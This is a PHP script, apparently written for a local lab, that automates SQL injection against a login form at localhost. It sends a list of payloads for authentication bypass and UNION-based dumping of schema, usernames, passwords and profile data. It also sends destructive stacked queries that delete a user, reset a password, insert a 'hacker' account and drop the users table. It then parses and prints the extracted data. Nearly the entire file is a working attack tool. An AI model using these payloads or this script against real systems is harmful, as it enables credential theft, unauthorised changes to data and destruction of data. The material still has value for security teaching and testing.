<?php

$target = "http://localhost:8080";

$payloads = [
    "' OR 1=1; --",
    "alessio.rossi' -- ",
    "' UNION SELECT NULL, GROUP_CONCAT(table_name), NULL FROM information_schema.tables WHERE table_schema = DATABASE()-- -",
    "' UNION SELECT 1, GROUP_CONCAT(column_name), 3 FROM information_schema.columns WHERE table_name='profiles' AND table_schema=DATABASE()-- -",
    "' UNION SELECT 1, GROUP_CONCAT(column_name), 3 FROM information_schema.columns WHERE table_name='users' AND table_schema=DATABASE()-- -",
    "' UNION SELECT id, username, password FROM users-- -",
    "' UNION SELECT user_id, telefono, nazionalita FROM profiles-- -",
    "'; DELETE FROM users WHERE username='andrea.moretto'; --",
    "'; UPDATE users SET password='123456' WHERE username='martina.bianchi'; -- ",
    "'; INSERT INTO users (username, password) VALUES ('hacker', 'hacked123'); SELECT * FROM users WHERE 1=1; --",
    "'; DROP TABLE users; -- "
];

foreach ($payloads as $payload) {
    $username = urlencode($payload);
    $password = urlencode($payload);
    $url = "{$target}?username={$username}&password={$password}";

    echo "\n[+] Testando: {$payload}\n";
    $response = @file_get_contents($url);

    if ($response === false) {
        echo "[-] Errore connessione\n";
        continue;
    }

    $is_modifica = str_contains($payload, 'DELETE') || str_contains($payload, 'UPDATE') || str_contains($payload, 'DROP');
if ($is_modifica) {
    $cleaned = strip_tags($response);
    $cleaned = html_entity_decode($cleaned);
    if (str_contains($cleaned, 'username: admin')) {
        echo "[-] Operazione non completata\n";
    } else {
        echo "[+] Operazione completata\n";
    }
}
    // Estrazione dei dati
    if (preg_match_all('/<div class="success">(.*?)<\/div>/is', $response, $matches)) {
        foreach ($matches[1] as $block) {
            $clean = str_replace(['<br>', '<br/>', '<br />'], "\n", $block);
            $decoded = html_entity_decode(strip_tags($clean));
            $lines = array_values(array_filter(array_map('trim', explode("\n", $decoded))));

            $lines = array_filter($lines, function ($line) {
                return stripos($line, 'operazione completata') === false &&
                       stripos($line, 'operazione non completata') === false;
            });

            if (
                str_contains($payload, "GROUP_CONCAT(column_name)") &&
                str_contains($payload, "information_schema.columns")
            ) {
                $labels = ['col1', 'col2', 'col3'];
            } elseif (str_contains($payload, 'profiles')) {
                $labels = ['user_id', 'telefono', 'nazionalità'];
            } elseif (str_contains($payload, 'users')) {
                $labels = ['id', 'username', 'password'];
            } elseif (str_contains($payload, 'table_name')) {
                $labels = ['col1', 'table_names', 'col3'];
            } else {
                $labels = ['col1', 'col2', 'col3'];
            }

            for ($i = 0; $i < count($lines); $i += 3) {
                $a = $lines[$i] ?? '';
                $b = $lines[$i + 1] ?? '';
                $c = $lines[$i + 2] ?? '';
                echo "{$labels[0]}: $a | {$labels[1]}: $b | {$labels[2]}: $c\n";
            }
        }
    }

    echo "-----------------------------\n";
}
?>
